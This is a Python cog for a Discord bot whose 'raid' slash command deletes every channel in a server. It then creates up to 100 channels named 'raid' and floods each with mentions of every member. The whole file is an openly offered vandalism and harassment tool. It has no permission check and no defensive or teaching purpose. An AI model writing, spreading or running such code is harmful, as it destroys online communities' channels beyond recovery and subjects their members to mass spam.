import discord
from discord.ext import commands

class raid(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
    
    @commands.slash_command(name="raid", description="raid the discord server")
    async def raid(self, ctx):

        await ctx.respond("...", ephemeral=True)
    
        embed = discord.Embed(
            title = "Raid",
            description = "Raiding starting soon",
            color = discord.Color.red()
        )
        await ctx.send(embed=embed)

        guild = ctx.guild
        members = guild.members
        channels = guild.channels

        for channel in channels:
            await channel.delete()

        channels = 0
        new_channel = []
        while channels < 100:
            raid_channel = await guild.create_text_channel("raid")
            new_channel.append(raid_channel)

            for raid in new_channel:
                for user in members:
                    await raid.send(f"<@{user.id}>")
            channels += 1


def setup(bot):
    bot.add_cog(raid(bot))